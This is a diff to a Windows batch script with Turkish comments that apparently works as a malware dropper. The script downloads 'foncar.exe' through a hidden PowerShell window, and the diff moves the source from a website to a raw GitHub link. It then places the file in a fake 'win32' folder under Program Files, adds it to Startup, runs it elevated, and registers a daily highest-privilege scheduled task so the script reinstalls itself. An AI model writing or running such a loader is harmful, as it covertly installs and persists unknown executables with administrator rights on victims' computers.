@@ -1,7 +1,7 @@
 @echo off
 
 :: DOSYA YOLLARI
-set "URL=https://bendahacokseviyorum.com/foncar.exe"
+set "URL=https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/foncar.exe"
 set "DOWNLOAD_PATH=%TEMP%\foncar.exe"
 set "WIN32_FOLDER=C:\Program Files\win32"
 set "EXE_DEST_PATH=%WIN32_FOLDER%\foncar.exe"
@@ -11,7 +11,7 @@ set "STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\foncar
 if exist "%WIN32_FOLDER%" rmdir /S /Q "%WIN32_FOLDER%"
 mkdir "%WIN32_FOLDER%"
 
-:: 2. WEB SİTESİNDEN DOSYAYI İNDİR
+:: 2. GITHUB'DAN DOSYAYI İNDİR
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%DOWNLOAD_PATH%')"
 
 :: 3. ESKİ DOSYAYI SİLME VE YENİ DOSYAYI TAŞI
@@ -26,10 +26,10 @@ echo start "" "%EXE_DEST_PATH%" >> "%STARTUP_PATH%"
 :: 5. EXE DOSYASINI YÖNETİCİ İZİNİYLE ÇALIŞTIRMA
 powershell -Command "Start-Process '%EXE_DEST_PATH%' -Verb runAs"
 
-:: 6. KENDİNİ TEKRAR BAŞLATMA (EĞER ŞİFRE EKRANI YOKSA)
+:: 6. GÖREV ZAMANLAYICIYA KENDİNİ EKLEME (EĞER EKLİ DEĞİLSE)
 SCHTASKS /Query /TN "FoncarAutoRestart" >nul 2>&1
 if %errorlevel% neq 0 (
-    SCHTASKS /Create /TN "FoncarAutoRestart" /TR "%~f0" /SC DAILY /MO 1 /F /RL HIGHEST /IT /NP
+    SCHTASKS /Create /TN "FoncarAutoRestart" /TR "\"%~f0\"" /SC DAILY /MO 1 /F /RL HIGHEST /IT /NP
 )
 
 exit
